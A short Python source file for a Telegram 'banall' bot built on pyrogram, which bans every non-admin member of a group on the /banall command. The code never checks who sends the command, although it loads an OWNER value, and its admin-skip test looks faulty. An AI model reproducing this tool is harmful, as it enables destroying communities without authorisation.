import os
import logging
from pyrogram import Client, filters, idle
from pyrogram.types import Message
from pyrogram.errors import ChatAdminRequired

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

# config vars
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER = os.getenv("OWNER")

# pyrogram client
app = Client(
    "banall",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)

@app.on_message(
    filters.command("banall") 
    & filters.group
)
async def banall_command(client, message: Message):
    print(f"Getting members from {message.chat.id}")
    
    async for member in app.get_chat_members(message.chat.id):
        if member.status in ["administrator", "creator"]:
            # Skip admins
            continue
        try:
            await app.ban_chat_member(chat_id=message.chat.id, user_id=member.user.id)
            print(f"Banned {member.user.id} from {message.chat.id}")
        except ChatAdminRequired:
            print("Bot lacks permissions to ban users in this chat.")
        except Exception as e:
            print(f"Failed to ban {member.user.id}: {e}")
    
    print("Process completed")

# start bot client
app.start()
print("Banall-Bot Booted Successfully")
idle()
